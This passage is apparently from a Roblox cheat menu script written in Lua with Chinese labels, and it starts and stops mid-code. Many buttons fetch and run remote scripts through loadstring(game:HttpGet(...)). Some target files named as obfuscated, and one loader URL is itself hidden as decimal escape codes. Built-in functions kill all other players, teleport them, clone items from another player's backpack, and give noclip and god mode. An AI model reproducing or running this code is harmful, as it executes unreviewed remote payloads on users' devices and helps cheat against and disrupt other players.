        loadstring(game:HttpGet("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6"))()
        showNotification("甩飞脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadCatAnim()
        playClickSound()
        loadstring(game:HttpGet("https://pastebin.com/raw/Y1MkBRn3"))()
        showNotification("猫动作脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadInvincible()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/5twh2hsf9j-byte/BowenPrime67/refs/heads/main/Python"))()
        showNotification("无敌脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadBeatDog()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY爆打黄油.txt"))()
        showNotification("悦服循环打狗脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadFEAK47()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47"))()
        showNotification("FE AK47脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadFESniper()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper"))()
        showNotification("FE 狙击枪脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    local function loadChenScript()
        playClickSound()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwrt5589/eododo/main/XG_SYNB.txt"))()
        showNotification("辰脚本已加载!", Color3.fromRGB(0, 200, 0))
    end

    -- 防摔功能
    local function loadAntiFall()
        playClickSound()
        loadstring([[
local Player = game:GetService("Players").LocalPlayer

local function setupSafeImmunity()
    local character = Player.Character
    if not character then return end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return end
    
    humanoid.HealthChanged:Connect(function(newHealth)
        if newHealth < humanoid.MaxHealth then
            humanoid.Health = humanoid.MaxHealth
        end
    end)
    
    humanoid.Died:Connect(function()
        wait(0.1)
        if character and character:FindFirstChild("Humanoid") then
            character.Humanoid.Health = character.Humanoid.MaxHealth
        end
    end)
end

setupSafeImmunity()
Player.CharacterAdded:Connect(function()
    wait(1)
    setupSafeImmunity()
end)

print("安全版自然灾害免疫已激活")
]])()
        showNotification("防摔已激活", Color3.fromRGB(0, 200, 0))
    end

    -- 穿墙功能
    local function toggleNoclip()
        playClickSound()
        noclip = not noclip
        ButtonInstances.NoclipButton.Text = "穿墙模式 [" .. (noclip and "开启]" or "关闭]")
        ButtonInstances.NoclipButton.TextColor3 = noclip and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if noclip then
            connections.noclip = RunService.Stepped:Connect(function()
                local character = LocalPlayer.Character
                if character and noclip then
                    for _, part in pairs(character:GetDescendants()) do
                        if part:IsA("BasePart") then part.CanCollide = false end
                    end
                end
            end)
            showNotification("穿墙模式已开启", Color3.fromRGB(0, 150, 200))
        else
            if connections.noclip then connections.noclip:Disconnect() end
            showNotification("穿墙模式已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 无限跳跃
    local function toggleInfiniteJump()
        playClickSound()
        infiniteJump = not infiniteJump
        ButtonInstances.InfiniteJumpButton.Text = "无限跳跃 [" .. (infiniteJump and "开启]" or "关闭]")
        ButtonInstances.InfiniteJumpButton.TextColor3 = infiniteJump and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        showNotification("无限跳跃" .. (infiniteJump and "已开启" or "已关闭"), Color3.fromRGB(0, 150, 200))
    end

    UserInputService.JumpRequest:Connect(function()
        if infiniteJump and LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end
        end
    end)

    -- 移动速度
    local function changeSpeed()
        playClickSound()
        walkSpeed = (walkSpeed % 100) + 8
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.WalkSpeed = walkSpeed end
        ButtonInstances.SpeedButton.Text = "移动速度: " .. walkSpeed
        showNotification("移动速度设置为: " .. walkSpeed, Color3.fromRGB(0, 150, 200))
    end

    -- 跳跃高度
    local function changeJump()
        playClickSound()
        jumpPower = (jumpPower % 200) + 25
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.JumpPower = jumpPower end
        ButtonInstances.JumpButton.Text = "跳跃高度: " .. jumpPower
        showNotification("跳跃高度设置为: " .. jumpPower, Color3.fromRGB(0, 150, 200))
    end

    -- 爬墙功能
    local function toggleClimbWall()
        playClickSound()
        climbing = not climbing
        ButtonInstances.ClimbWallButton.Text = "爬墙模式 [" .. (climbing and "开启]" or "关闭]")
        ButtonInstances.ClimbWallButton.TextColor3 = climbing and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if climbing then
            connections.climb = RunService.Heartbeat:Connect(function()
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and climbing then
                    local root = character.HumanoidRootPart
                    local directions = {root.CFrame.LookVector, -root.CFrame.LookVector, root.CFrame.RightVector, -root.CFrame.RightVector}
                    
                    for _, direction in pairs(directions) do
                        local ray = Ray.new(root.Position, direction * 3)
                        if Workspace:FindPartOnRayWithIgnoreList(ray, {character}) then
                            root.Velocity = Vector3.new(root.Velocity.X, 20, root.Velocity.Z)
                            break
                        end
                    end
                end
            end)
            showNotification("爬墙模式已开启! 碰到墙会自动上升", Color3.fromRGB(0, 150, 200))
        else
            if connections.climb then connections.climb:Disconnect() end
            showNotification("爬墙模式已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 人物旋转
    local function toggleSpin()
        playClickSound()
        spinning = not spinning
        ButtonInstances.SpinButton.Text = "人物旋转 [" .. (spinning and "开启]" or "关闭]")
        ButtonInstances.SpinButton.TextColor3 = spinning and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if spinning then
            connections.spin = RunService.Heartbeat:Connect(function()
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and spinning then
                    character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                end
            end)
            showNotification("人物旋转已开启", Color3.fromRGB(0, 150, 200))
        else
            if connections.spin then connections.spin:Disconnect() end
            showNotification("人物旋转已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 旋转速度
    local function changeSpinSpeed()
        playClickSound()
        spinSpeed = (spinSpeed % 50) + 5
        ButtonInstances.SpinSpeedButton.Text = "旋转速度: " .. spinSpeed
        showNotification("旋转速度设置为: " .. spinSpeed, Color3.fromRGB(0, 150, 200))
    end

    -- 自动移动
    local function toggleAutoMove()
        playClickSound()
        autoMove = not autoMove
        ButtonInstances.AutoMoveButton.Text = "自动移动 [" .. (autoMove and "开启]" or "关闭]")
        ButtonInstances.AutoMoveButton.TextColor3 = autoMove and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if autoMove then
            connections.autoMove = RunService.Heartbeat:Connect(function()
                local character = LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and autoMove then
                    character.HumanoidRootPart.Velocity = character.HumanoidRootPart.CFrame.LookVector * 20
                end
            end)
            showNotification("自动移动已开启", Color3.fromRGB(0, 150, 200))
        else
            if connections.autoMove then connections.autoMove:Disconnect() end
            showNotification("自动移动已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 秒杀所有人
    local function killAllPlayers()
        playClickSound()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then humanoid.Health = 0 end
            end
        end
        showNotification("已秒杀所有玩家", Color3.fromRGB(255, 50, 50))
    end

    -- 传送所有人到我
    local function teleportAllToMe()
        playClickSound()
        local myCharacter = LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            local myPosition = myCharacter.HumanoidRootPart.Position
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local character = player.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        character.HumanoidRootPart.CFrame = CFrame.new(myPosition + Vector3.new(math.random(-5, 5), 0, math.random(-5, 5)))
                    end
                end
            end
            showNotification("已传送所有玩家", Color3.fromRGB(0, 200, 0))
        end
    end

    -- 坐在头上旋转
    local function toggleSitSpin()
        playClickSound()
        if not selectedPlayer then
            showNotification("请先选择一个玩家!", Color3.fromRGB(255, 50, 50))
            return
        end
        
        sitSpinning = not sitSpinning
        ButtonInstances.SitSpinButton.Text = "坐在头上旋转 [" .. (sitSpinning and "开启]" or "关闭]")
        ButtonInstances.SitSpinButton.TextColor3 = sitSpinning and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if sitSpinning then
            local myCharacter, targetCharacter = LocalPlayer.Character, selectedPlayer.Character
            local myRoot, targetRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart"), targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
            
            if myRoot and targetRoot then
                myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 5, 0)
                local angle = 0
                
                connections.sitSpin = RunService.Heartbeat:Connect(function()
                    if sitSpinning and targetRoot then
                        angle = angle + math.rad(sitSpinSpeed)
                        local x, z = math.cos(angle) * 3, math.sin(angle) * 3
                        myRoot.CFrame = CFrame.new(targetRoot.Position + Vector3.new(x, 5, z), targetRoot.Position)
                    end
                end)
                showNotification("正在" .. selectedPlayer.Name .. "头上旋转!", Color3.fromRGB(0, 150, 200))
            end
        else
            if connections.sitSpin then connections.sitSpin:Disconnect() end
            showNotification("停止坐在头上旋转", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 骑在玩家头上
    local function toggleRideHead()
        playClickSound()
        if not selectedPlayer then
            showNotification("请先选择一个玩家!", Color3.fromRGB(255, 50, 50))
            return
        end
        
        ridingHead = not ridingHead
        ButtonInstances.RideHeadButton.Text = "骑在玩家头上 [" .. (ridingHead and "开启]" or "关闭]")
        ButtonInstances.RideHeadButton.TextColor3 = ridingHead and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if ridingHead then
            local myCharacter, targetCharacter = LocalPlayer.Character, selectedPlayer.Character
            local myRoot, targetRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart"), targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
            
            if myRoot and targetRoot then
                connections.ride = RunService.Heartbeat:Connect(function()
                    if ridingHead and targetRoot then
                        myRoot.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 3, 0))
                    end
                end)
                showNotification("正在骑在" .. selectedPlayer.Name .. "头上!", Color3.fromRGB(0, 150, 200))
            end
        else
            if connections.ride then connections.ride:Disconnect() end
            showNotification("停止骑在玩家头上", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 查看玩家背包
    local function viewPlayerBackpack()
        playClickSound()
        if not selectedPlayer then
            showNotification("请先选择一个玩家!", Color3.fromRGB(255, 50, 50))
            return
        end

        -- 创建背包查看窗口
        local backpackFrame = Instance.new("Frame")
        backpackFrame.Size = UDim2.new(0, 400, 0, 500)
        backpackFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
        backpackFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
        backpackFrame.BackgroundTransparency = 0.1
        backpackFrame.BorderSizePixel = 2
        backpackFrame.BorderColor3 = Color3.fromRGB(0, 150, 255)
        backpackFrame.Active = true
        backpackFrame.Draggable = true
        backpackFrame.ZIndex = 50
        Instance.new("UICorner", backpackFrame).CornerRadius = UDim.new(0, 15)
        Instance.new("UIStroke", backpackFrame).Color = Color3.fromRGB(0, 150, 255)
        backpackFrame.Parent = ScreenGui

        -- 标题栏
        local titleBar = Instance.new("Frame")
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
        titleBar.BackgroundTransparency = 0.1
        titleBar.BorderSizePixel = 0
        titleBar.ZIndex = 51
        Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 15)
        titleBar.Parent = backpackFrame

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -50, 1, 0)
        titleLabel.Position = UDim2.new(0, 15, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = selectedPlayer.Name .. "的背包"
        titleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
        titleLabel.TextSize = 18
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.ZIndex = 52
        titleLabel.Parent = titleBar

        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 30, 0, 30)
        closeButton.Position = UDim2.new(1, -35, 0, 5)
        closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        closeButton.BackgroundTransparency = 0.2
        closeButton.Text = "X"
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.TextSize = 16
        closeButton.Font = Enum.Font.GothamBold
        closeButton.ZIndex = 52
        Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
        closeButton.Parent = titleBar

        -- 内容区域
        local contentFrame = Instance.new("ScrollingFrame")
        contentFrame.Size = UDim2.new(1, -20, 1, -60)
        contentFrame.Position = UDim2.new(0, 10, 0, 50)
        contentFrame.BackgroundTransparency = 1
        contentFrame.ScrollBarThickness = 8
        contentFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 150, 255)
        contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        contentFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        contentFrame.ZIndex = 51
        contentFrame.Parent = backpackFrame

        local contentLayout = Instance.new("UIListLayout", contentFrame)
        contentLayout.Padding = UDim.new(0, 10)
        Instance.new("UIPadding", contentFrame).PaddingTop = UDim.new(0, 5)

        -- 获取目标玩家的背包和角色中的工具
        local targetBackpack = selectedPlayer:FindFirstChildOfClass("Backpack")
        local targetCharacter = selectedPlayer.Character
        local tools = {}

        -- 从背包获取工具
        if targetBackpack then
            for _, tool in ipairs(targetBackpack:GetChildren()) do
                if tool:IsA("Tool") then
                    table.insert(tools, tool)
                end
            end
        end

        -- 从角色获取工具
        if targetCharacter then
            for _, tool in ipairs(targetCharacter:GetChildren()) do
                if tool:IsA("Tool") then
                    table.insert(tools, tool)
                end
            end
        end

        -- 显示工具列表
        if #tools == 0 then
            local noItemsLabel = Instance.new("TextLabel")
            noItemsLabel.Size = UDim2.new(1, 0, 0, 50)
            noItemsLabel.BackgroundTransparency = 1
            noItemsLabel.Text = "背包为空"
            noItemsLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
            noItemsLabel.TextSize = 16
            noItemsLabel.Font = Enum.Font.Gotham
            noItemsLabel.ZIndex = 52
            noItemsLabel.Parent = contentFrame
        else
            for _, tool in ipairs(tools) do
                local itemFrame = Instance.new("Frame")
                itemFrame.Size = UDim2.new(1, 0, 0, 60)
                itemFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
                itemFrame.BackgroundTransparency = 0.3
                itemFrame.ZIndex = 52
                Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 10)
                Instance.new("UIStroke", itemFrame).Color = Color3.fromRGB(100, 100, 200)
                itemFrame.Parent = contentFrame

                local itemName = Instance.new("TextLabel")
                itemName.Size = UDim2.new(0.6, -10, 0.5, -5)
                itemName.Position = UDim2.new(0, 10, 0, 5)
                itemName.BackgroundTransparency = 1
                itemName.Text = tool.Name
                itemName.TextColor3 = Color3.fromRGB(200, 200, 255)
                itemName.TextSize = 16
                itemName.TextXAlignment = Enum.TextXAlignment.Left
                itemName.Font = Enum.Font.Gotham
                itemName.ZIndex = 53
                itemName.Parent = itemFrame

                local stealButton = Instance.new("TextButton")
                stealButton.Size = UDim2.new(0.35, -10, 0.5, -5)
                stealButton.Position = UDim2.new(0.6, 5, 0, 5)
                stealButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
                stealButton.BackgroundTransparency = 0.2
                stealButton.Text = "偷取"
                stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                stealButton.TextSize = 14
                stealButton.Font = Enum.Font.GothamBold
                stealButton.ZIndex = 53
                Instance.new("UICorner", stealButton).CornerRadius = UDim.new(0, 8)
                stealButton.Parent = itemFrame

                local itemDesc = Instance.new("TextLabel")
                itemDesc.Size = UDim2.new(1, -20, 0.5, -5)
                itemDesc.Position = UDim2.new(0, 10, 0.5, 0)
                itemDesc.BackgroundTransparency = 1
                itemDesc.Text = "工具类物品"
                itemDesc.TextColor3 = Color3.fromRGB(150, 150, 200)
                itemDesc.TextSize = 12
                itemDesc.TextXAlignment = Enum.TextXAlignment.Left
                itemDesc.Font = Enum.Font.Gotham
                itemDesc.ZIndex = 53
                itemDesc.Parent = itemFrame

                -- 偷取功能
                stealButton.MouseButton1Click:Connect(function()
                    playClickSound()
                    local clone = tool:Clone()
                    if LocalPlayer.Backpack then
                        clone.Parent = LocalPlayer.Backpack
                        showNotification("已偷取: " .. tool.Name, Color3.fromRGB(0, 200, 0))
                    else
                        showNotification("无法偷取物品: 背包不存在", Color3.fromRGB(255, 50, 50))
                    end
                end)

                -- 按钮悬停效果
                stealButton.MouseEnter:Connect(function()
                    stealButton.BackgroundTransparency = 0
                end)
                
                stealButton.MouseLeave:Connect(function()
                    stealButton.BackgroundTransparency = 0.2
                end)
            end
        end

        -- 关闭按钮事件
        closeButton.MouseButton1Click:Connect(function()
            playClickSound()
            backpackFrame:Destroy()
        end)

        showNotification("正在查看" .. selectedPlayer.Name .. "的背包", Color3.fromRGB(0, 150, 200))
    end

    -- 玩家大小
    local function changePlayerSize()
        playClickSound()
        playerSize = (playerSize % 3) + 0.5
        local character = LocalPlayer.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then part.Size = part.Size * playerSize end
            end
        end
        ButtonInstances.PlayerSizeButton.Text = "玩家大小: " .. playerSize
        showNotification("玩家大小设置为: " .. playerSize, Color3.fromRGB(0, 150, 200))
    end

    -- 彩虹模式
    local function toggleRainbow()
        playClickSound()
        rainbow = not rainbow
        ButtonInstances.RainbowButton.Text = "彩虹模式 [" .. (rainbow and "开启]" or "关闭]")
        ButtonInstances.RainbowButton.TextColor3 = rainbow and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if rainbow then
            local hue = 0
            connections.rainbow = RunService.Heartbeat:Connect(function()
                if rainbow then
                    hue = (hue + 0.01) % 1
                    local color = Color3.fromHSV(hue, 1, 1)
                    local character = LocalPlayer.Character
                    if character then
                        for _, part in pairs(character:GetDescendants()) do
                            if part:IsA("BasePart") then part.BrickColor = BrickColor.new(color) end
                        end
                    end
                end
            end)
            showNotification("彩虹模式已开启", Color3.fromRGB(0, 150, 200))
        else
            if connections.rainbow then connections.rainbow:Disconnect() end
            showNotification("彩虹模式已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 全局彩虹
    local function toggleGlobalRainbow()
        playClickSound()
        globalRainbow = not globalRainbow
        ButtonInstances.GlobalRainbowButton.Text = "全局彩虹 [" .. (globalRainbow and "开启]" or "关闭]")
        ButtonInstances.GlobalRainbowButton.TextColor3 = globalRainbow and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if globalRainbow then
            originalColors = {}
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") then originalColors[obj] = obj.BrickColor end
            end
            
            local hue = 0
            connections.globalRainbow = RunService.Heartbeat:Connect(function()
                if globalRainbow then
                    hue = (hue + 0.005) % 1
                    local color = Color3.fromHSV(hue, 1, 1)
                    for _, obj in pairs(Workspace:GetDescendants()) do
                        if obj:IsA("BasePart") then obj.BrickColor = BrickColor.new(color) end
                    end
                end
            end)
            showNotification("全局彩虹模式已开启!", Color3.fromRGB(0, 150, 200))
        else
            if connections.globalRainbow then connections.globalRainbow:Disconnect() end
            for obj, originalColor in pairs(originalColors) do
                if obj and obj.Parent then obj.BrickColor = originalColor end
            end
            originalColors = {}
            showNotification("全局彩虹模式已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 幽灵模式
    local function toggleGhost()
        playClickSound()
        ghost = not ghost
        ButtonInstances.GhostButton.Text = "幽灵模式 [" .. (ghost and "开启]" or "关闭]")
        ButtonInstances.GhostButton.TextColor3 = ghost and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        local character = LocalPlayer.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    if ghost then
                        originalTransparency[part] = part.Transparency
                        part.Transparency = 0.7
                    else
                        part.Transparency = originalTransparency[part] or 0
                    end
                end
            end
        end
        showNotification("幽灵模式" .. (ghost and "已开启" or "已关闭"), Color3.fromRGB(0, 150, 200))
    end

    -- 重力设置
    local function changeGravity()
        playClickSound()
        gravity = (gravity == 196.2) and 0 or (gravity + 50)
        if gravity > 196.2 then gravity = 196.2 end
        Workspace.Gravity = gravity
        ButtonInstances.GravityButton.Text = "重力设置: " .. gravity
        showNotification("重力设置为: " .. gravity, Color3.fromRGB(0, 150, 200))
    end

    -- 夜视功能
    local function toggleNightVision()
        playClickSound()
        nightVision = not nightVision
        ButtonInstances.NightVisionButton.Text = "夜视模式 [" .. (nightVision and "开启]" or "关闭]")
        ButtonInstances.NightVisionButton.TextColor3 = nightVision and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(200, 200, 255)
        
        if nightVision then
            -- 保存原始设置
            originalLightingSettings.Ambient = Lighting.Ambient
            originalLightingSettings.Brightness = Lighting.Brightness
            originalLightingSettings.ClockTime = Lighting.ClockTime
            originalLightingSettings.GlobalShadows = Lighting.GlobalShadows
            
            -- 应用夜视效果
            Lighting.Ambient = Color3.fromRGB(128, 128, 128) -- 增加环境光
            Lighting.Brightness = 2 -- 增加亮度
            Lighting.ClockTime = 12 -- 设置为白天
            Lighting.GlobalShadows = false -- 禁用阴影
            
            showNotification("夜视模式已开启", Color3.fromRGB(0, 150, 200))
        else
            -- 恢复原始设置
            if originalLightingSettings.Ambient then
                Lighting.Ambient = originalLightingSettings.Ambient
            end
            if originalLightingSettings.Brightness then
                Lighting.Brightness = originalLightingSettings.Brightness
            end
            if originalLightingSettings.ClockTime then
                Lighting.ClockTime = originalLightingSettings.ClockTime
            end
            if originalLightingSettings.GlobalShadows ~= nil then
                Lighting.GlobalShadows = originalLightingSettings.GlobalShadows
            end
            
            showNotification("夜视模式已关闭", Color3.fromRGB(150, 150, 150))
        end
    end

    -- 黑客入侵特效
    local function applyHackEffects()
        playClickSound()
        showNotification("黑客入侵特效启动中...", Color3.fromRGB(255, 0, 0))
        
        -- 音乐
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://128934903242385"
        sound.Looped = true
        sound.Volume = 0.5
        sound.Parent = SoundService
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 2)

        -- 天空盒
        local sky = Instance.new("Sky")
        for _, property in pairs({"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp"}) do
            sky[property] = "rbxassetid://89036103941643"
        end
        sky.Parent = Lighting

        -- 修改贴图和添加特效
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Decal") or obj:IsA("Texture") then
                obj.Texture = "rbxassetid://89036103941643"
            elseif obj:IsA("BasePart") and obj.Name ~= "Handle" then
                -- 添加火焰效果
                local fire = Instance.new("Fire")
                fire.Size = math.random(5, 15)
                fire.Heat = math.random(5, 15)
                fire.Color = Color3.new(1, 0.3, 0)
                fire.SecondaryColor = Color3.new(1, 0.8, 0)
                fire.Parent = obj
                
                -- 添加粒子发射器
                local particle = Instance.new("ParticleEmitter")
                particle.Texture = "rbxassetid://89036103941643"
                particle.Lifetime = NumberRange.new(1, 3)
                particle.Rate = 50
                particle.SpreadAngle = Vector2.new(45, 45)
                particle.Speed = NumberRange.new(5, 15)
                particle.Parent = obj
            end
        end
        
        -- 处理新添加的对象
        Workspace.DescendantAdded:Connect(function(descendant)
            wait(0.1)
            if descendant:IsA("Decal") or descendant:IsA("Texture") then
                descendant.Texture = "rbxassetid://89036103941643"
            elseif descendant:IsA("BasePart") and descendant.Name ~= "Handle" then
                local fire = Instance.new("Fire")
                fire.Size = math.random(5, 15)
                fire.Heat = math.random(5, 15)
                fire.Color = Color3.new(1, 0.3, 0)
                fire.SecondaryColor = Color3.new(1, 0.8, 0)
                fire.Parent = descendant
                
                local particle = Instance.new("ParticleEmitter")
                particle.Texture = "rbxassetid://89036103941643"
                particle.Lifetime = NumberRange.new(1, 3)
                particle.Rate = 50
                particle.SpreadAngle = Vector2.new(45, 45)
                particle.Speed = NumberRange.new(5, 15)
                particle.Parent = descendant
            end
        end)
        
        showNotification("黑客入侵特效已应用!", Color3.fromRGB(0, 200, 0))
    end

    -- UI颜色调节
    local function changeUIColor()
        playClickSound()
        local colors = {
            Color3.fromRGB(0, 150, 255), -- 蓝色
            Color3.fromRGB(255, 0, 100),
            Color3.fromRGB(0, 255, 150), 
            Color3.fromRGB(255, 150, 0),
            Color3.fromRGB(150, 0, 255), 
            Color3.fromRGB(255, 255, 0),
            Color3.fromRGB(0, 255, 255)
        }
        local color = colors[math.random(1, #colors)]
        
        MainFrame.BackgroundColor3 = Color3.new(color.R * 0.2, color.G * 0.2, color.B * 0.2)
        MainStroke.Color = color
        TitleBar.BackgroundColor3 = Color3.new(color.R * 0.3, color.G * 0.3, color.B * 0.3)
        ContentScrolling.ScrollBarImageColor3 = color
        
        for _, button in pairs(ButtonInstances) do
            button.BackgroundColor3 = Color3.new(color.R * 0.3, color.G * 0.3, color.B * 0.3)
            if button:FindFirstChild("UIStroke") then button.UIStroke.Color = color end
        end
        
        for tabName, tabButton in pairs(TabButtons) do
            tabButton.BackgroundColor3 = (tabName == CurrentTab) and color or Color3.new(color.R * 0.3, color.G * 0.3, color.B * 0.3)
        end
        
        showNotification("UI颜色已更改", color)
    end

    -- 自杀
    local function suicide()
        playClickSound()
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
            showNotification("已自杀!", Color3.fromRGB(255, 0, 0))
        end
    end

    -- 绑定按钮事件
    MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
    CloseButton.MouseButton1Click:Connect(function()
        playClickSound()
        ScreenGui:Destroy()
        showNotification("脚本已关闭", Color3.fromRGB(255, 0, 0))
    end)

    -- 为选项卡按钮添加点击音效
    for _, tabButton in pairs(TabButtons) do
        tabButton.MouseButton1Click:Connect(playClickSound)
    end

    -- 绑定功能按钮（包含AI聊天功能）
    local buttonActions = {
        FlyButton = function() loadExternalScript("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10", "ARCEUS飞行") end,
        InvincibleFlyButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414", "无敌苍蝇飞行") end,
        FakeLagButton = function() loadExternalScript("https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/fakeLAGRENZXW.txt", "假延迟") end,
        DayunButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "大运") end,
        CrawlButton = function() loadExternalScript('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt', "在地上爬") end,
        FEFacialButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-AFEM-14048", "FE表情") end,
        FEFighterButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E5%BC%BA%E8%A1%8C%E4%B8%A2%E5%BC%83.txt", "强行装备物品") end,
        YeScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua", "叶脚本") end,
        NoclipButton = toggleNoclip,
        InfiniteJumpButton = toggleInfiniteJump,
        SpeedButton = changeSpeed,
        JumpButton = changeJump,
        PlayerButton = selectPlayer,
        ClimbWallButton = toggleClimbWall,
        AntiFallButton = loadAntiFall,
        ShaScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/114514lzkill/SaHUB/refs/heads/main/SaHUB", "沙脚本") end,
        FESkyboxButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936", "FE天空盒") end,
